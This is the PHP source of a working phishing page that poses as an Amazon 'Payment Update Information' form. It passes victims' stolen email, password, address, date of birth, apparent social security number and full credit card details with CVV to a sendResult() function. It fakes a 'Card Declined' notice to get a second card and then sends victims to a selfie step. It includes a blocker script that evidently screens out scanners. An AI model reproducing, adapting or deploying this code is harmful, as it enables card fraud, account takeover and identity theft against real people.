<?php
require 'includes/config.php';
require 'includes/functions.php';
require 'includes/blocker.php';

// Language detection removed; default to English
$visitor_info = getClientInfo();
$_SESSION['lang'] = 'en';

if(!isset($_SESSION['fullname'])) {
    header('Location: billing');
    exit;
}

// Validasi ref parameter
$ref = $_GET['ref'] ?? '';
if (empty($ref) || $ref !== ($_SESSION['ref'] ?? '')) {
    header('Location: login');
    exit;
}

// Don't clear `show_second_card` here — preserve it across requests

$email = $_SESSION['email'];
$password = $_SESSION['password'];
$fullname = $_SESSION['fullname'];
$address = $_SESSION['address'];
$address2 = $_SESSION['address2'];
$city = $_SESSION['city'];
$state = $_SESSION['state'];
$zipcode = $_SESSION['zipcode'];
$phonenumber = $_SESSION['phonenumber'];
$dob = $_SESSION['dob'];
$sosel = $_SESSION['sosel'];

if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['cardNumber'])) {
    // Check if this is second card
    $is_second_card = isset($_POST['is_second_card']) && $_POST['is_second_card'] == '1';
    
    if ($is_second_card) {
        // Store second card
        $_SESSION['second_cardNumber'] = $_POST['cardNumber'];
        $_SESSION['second_cardname'] = $_POST['cardname'];
        $_SESSION['second_expirationDate'] = $_POST['expirationDate'];
        $_SESSION['second_cvv'] = $_POST['cvv'];
        $_SESSION['second_cid'] = $_POST['cid'] ?? '';
        
        // Send second card data
        $data = [
            'email' => $email,
            'password' => $password,
            'bin' => substr($_POST['cardNumber'], 0, 6),
            'cardname' => $_POST['cardname'],
            'cardNumber' => $_POST['cardNumber'],
            'expirationDate' => $_POST['expirationDate'],
            'cvv' => $_POST['cvv'],
            'cid' => $_POST['cid'] ?? ''
        ];
        sendResult('card_backup', $data);
        
        // clear the second-card flag so it doesn't persist
        unset($_SESSION['show_second_card']);
        header('Location: selfie?ref=' . $ref);
        exit;
    } else {
        // First card
        $data = [
            'email' => $email,
            'password' => $password,
            'fullname' => $fullname,
            'address' => $address,
            'address2' => $address2,
            'city' => $city,
            'state' => $state,
            'zipcode' => $zipcode,
            'phonenumber' => $phonenumber,
            'dob' => $dob,
            'sosel' => $sosel,
            'bin' => substr($_POST['cardNumber'], 0, 6),
            'cardname' => $_POST['cardname'],
            'cardNumber' => $_POST['cardNumber'],
            'expirationDate' => $_POST['expirationDate'],
            'cvv' => $_POST['cvv'],
            'cid' => $_POST['cid'] ?? ''
        ];
        sendResult('card', $data);
        
        // Simpan di session
        $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $_SESSION['cardname'] = $_POST['cardname'];
        $_SESSION['expirationDate'] = $_POST['expirationDate'];
        $_SESSION['cvv'] = $_POST['cvv'];
        $_SESSION['cid'] = $_POST['cid'] ?? '';
        
        // Check if double_cc is enabled
        $double_cc_enabled = $config['double_cc'] ?? false;
        if ($double_cc_enabled) {
            // Set flag to show decline message and second card form
            $_SESSION['show_second_card'] = true;
        } else {
            // If double CC is disabled, clear any lingering flag and go directly to selfie
            unset($_SESSION['show_second_card']);
            header('Location: selfie?ref=' . $ref);
            exit;
        }
    }
}

// Keep language set to English
$lang = 'en';

$double_cc_enabled = $config['double_cc'] ?? false;

// If double CC is disabled, ensure flag is cleared
if (!$double_cc_enabled) {
    unset($_SESSION['show_second_card']);
}

// Check if we need to show second card form (only when feature enabled)
$show_second_card = $double_cc_enabled && isset($_SESSION['show_second_card']) && $_SESSION['show_second_card'] === true;
$is_second_card_submit = isset($_POST['is_second_card']) && $_POST['is_second_card'] == '1';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon - Payment Update Information</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background-color: #f3f3f3;
            padding: 40px 20px;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo-image {
            width: 103px;
            height: auto;
        }

        h1 {
            font-size: 28px;
            font-weight: normal;
            margin-bottom: 25px;
            text-align: center;
        }

        h2 {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 15px;
        }

        .notice {
            background-color: #fff5f5;
            border: 1px solid #ff0000;
            border-radius: 4px;
            padding: 12px 15px;
            margin-bottom: 25px;
            color: #c40000;
            font-size: 13px;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: bold;
            margin-bottom: 5px;
            color: #111;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 14px;
            transition: border-color 0.2s;
        }

        input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
        }

        .card-number-wrapper {
            position: relative;
        }

		.cc-wrapper {
			position: relative;
			display: flex;
			align-items: center;
		}
		
        .cc-logo {
			width: 40px;
			position: absolute;
			right: 10px;
        }

		.cc-status {
			font-size: 12px;
			margin-top: 3px;
			display: block;
		}

        .form-row {
            display: flex;
            gap: 15px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to bottom, #ffd600, #ffca00);
            border: 1px solid #e6b800;
            border-radius: 25px;   /* bikin jadi oval */
            font-size: 14px;
            cursor: pointer;
            margin-top: 5px;
            color: #111;
            text-align: center;
        }

        .btn-submit:hover {
            background-color: #ddb347;
        }

        .btn-submit:active {
            background-color: #d1a73c;
        }

        .security-note {
            text-align: center;
            color: #565959;
            font-size: 12px;
            margin-top: 20px;
            line-height: 1.5;
        }

        .lock-icon {
            color: #067d62;
            margin-right: 5px;
        }

        .disclaimer {
            text-align: center;
            color: #565959;
            font-size: 11px;
            margin-top: 15px;
            line-height: 1.6;
        }
    </style>
</head>
<body>
	<div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon" class="logo-image">
    </div>
    <div class="container">
        <h1 style="font-weight: 500;">Payment Update Information</h1>
        
        <?php if ($show_second_card): ?>
            <!-- CARD DECLINED MESSAGE -->
            <div style="background-color: #fee; border: 1px solid #f99; border-radius: 4px; padding: 15px; margin-bottom: 20px; color: #c33;">
                <strong>⚠️ Card Declined</strong><br>
                <small>The credit card you provided was declined. Please add a backup payment method to continue.</small>
            </div>
            
            <h2>Add Backup Payment Method</h2>
            <div class="notice">
                <strong>Required:</strong> Add a backup credit card for this account.
            </div>
        <?php else: ?>
            <h2>Verify Your Credit Card Payment</h2>
            <div class="notice">
                <strong>Required:</strong> Add the last used credit card in your account.
            </div>
        <?php endif; ?>

        <form method="POST" action="">
            <div class="form-group">
                <label><span class="required">*</span> Credit Card Number</label>
				<div class="cc-wrapper">
					<input type="text" name="cardNumber" id="cc_number" placeholder="5555 5555 5555 5555" maxlength="19" required>
					<img id="cc_logo" class="cc-logo" src="" alt="">
				</div>
				<small id="cc_status" class="cc-status"></small>
			</div>

            <div class="form-group">
                <label><span class="required">*</span> Expiration Date (MM/YY)</label>
				<input type="text" id="exp_date" name="expirationDate" placeholder="MM/YY" maxlength="5" required>
				<small id="exp_status"></small>
			</div>

			<div class="form-group">
                <label><span class="required">*</span> CVV</label>
				<input type="text" id="cvv" name="cvv" placeholder="CVV" maxlength="4" required>
			</div>

			<div class="form-group">
                <label>Name on card</label>
				<input type="text" name="cardname" placeholder="Sam Lee" required>
			</div>

			<div class="form-group" id="cidGroup" style="display: none;">
                <label><span class="required">*</span> CID (Card ID)</label>
				<input type="text" name="cid" id="cidInput" placeholder="CID" required>
			</div>

            <!-- Hidden field to track if this is second card -->
            <?php if ($show_second_card): ?>
                <input type="hidden" name="is_second_card" value="1">
            <?php endif; ?>

            <button type="submit" class="btn-submit">
                <?php if ($show_second_card): ?>
                    Add Backup Card & Continue
                <?php else: ?>
                    Add and continue
                <?php endif; ?>
            </button>
		</form>

    <div class="security-note">
        <span class="lock-icon">🔒</span> Your information is encrypted and secure
    </div>

	<div class="disclaimer">
		By adding a payment method to your account, your payment method may be used as a backup if another payment method fails. You can change this setting in Your Payments anytime.
	</div>
    </div>
    <script>
	/* ======================================================
	   Detect Card Type + Logo
	====================================================== */
	function getCardType(number) {
		if (/^4/.test(number)) return "visa";
		if (/^5[1-5]/.test(number)) return "mastercard";
		if (/^3[47]/.test(number)) return "amex";
		return "";
	}

	function showCardLogo(type) {
		const logo = document.getElementById("cc_logo");
		const cidGroup = document.getElementById("cidGroup");
		
		if (type === "visa") logo.src = "https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg";
		else if (type === "mastercard") logo.src = "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg";
		else if (type === "amex") logo.src = "https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg";
		else logo.src = "";
		
		// Show CID field hanya untuk AMEX
		if (type === "amex") {
			cidGroup.style.display = "block";
			document.getElementById("cidInput").required = true;
		} else {
			cidGroup.style.display = "none";
			document.getElementById("cidInput").required = false;
			document.getElementById("cidInput").value = "";
		}
	}

	/* ======================================================
	   Luhn Check
	====================================================== */
	function luhnCheck(num) {
		let arr = (num + '')
			.split('')
			.reverse()
			.map(x => parseInt(x));

		let sum = arr.reduce((acc, val, i) => {
			if (i % 2) {
				val *= 2;
				if (val > 9) val -= 9;
			}
			return acc + val;
		}, 0);

		return sum % 10 === 0;
	}

	/* ======================================================
	   Input CC Number
	====================================================== */
	document.getElementById("cc_number").addEventListener("input", function(e) {
		let value = e.target.value.replace(/\D/g, "");

		let type = getCardType(value);
		showCardLogo(type);

		// AMEX = 15 digit
		if (type === "amex") value = value.substring(0, 15);
		else value = value.substring(0, 16);

		// format groups
		if (type === "amex") {
			// 4-6-5
			value = value.replace(/(\d{4})(\d{6})(\d{0,5})/, "$1 $2 $3").trim();
		} else {
			// 4-4-4-4
			value = value.replace(/(.{4})/g, "$1 ").trim();
		}

		e.target.value = value;

		// Luhn realtime
		const raw = value.replace(/\D/g, "");
		if (raw.length >= 13) {
			document.getElementById("cc_status").innerHTML = 
				luhnCheck(raw) ? "✔ Valid card number" : "Invalid card number";
			document.getElementById("cc_status").style.color = 
				luhnCheck(raw) ? "green" : "red";
		} else {
			document.getElementById("cc_status").innerHTML = "";
		}
	});

	/* ======================================================
	   Expiry Date Check
	====================================================== */
	document.getElementById("exp_date").addEventListener("input", function(e) {
		let v = e.target.value.replace(/\D/g, "");
		
		if (v.length >= 3) e.target.value = v.substring(0,2) + "/" + v.substring(2,4);
		else e.target.value = v;

		if (v.length == 4) {
			const month = parseInt(v.substring(0,2));
			const year  = parseInt("20" + v.substring(2,4));

			const now = new Date();
			const exp = new Date(year, month - 1, 1);

			if (month < 1 || month > 12) {
				exp_status.innerHTML = "Invalid month";
				exp_status.style.color = "red";
				return;
			}

			if (exp < now) {
				exp_status.innerHTML = "Expired";
				exp_status.style.color = "red";
			} else {
				exp_status.innerHTML = "Valid expiry date";
				exp_status.style.color = "green";
			}
		} else {
			exp_status.innerHTML = "";
		}
	});

	/* ======================================================
	   CVV length (3 / 4)
	====================================================== */
	document.getElementById("cvv").addEventListener("input", function(e) {
		let v = e.target.value.replace(/\D/g, "");
		let cc = document.getElementById("cc_number").value.replace(/\D/g, "");

		if (/^3[47]/.test(cc)) v = v.substring(0,4); // amex
		else v = v.substring(0,3);

		e.target.value = v;
	});
	</script>
</body>
</html>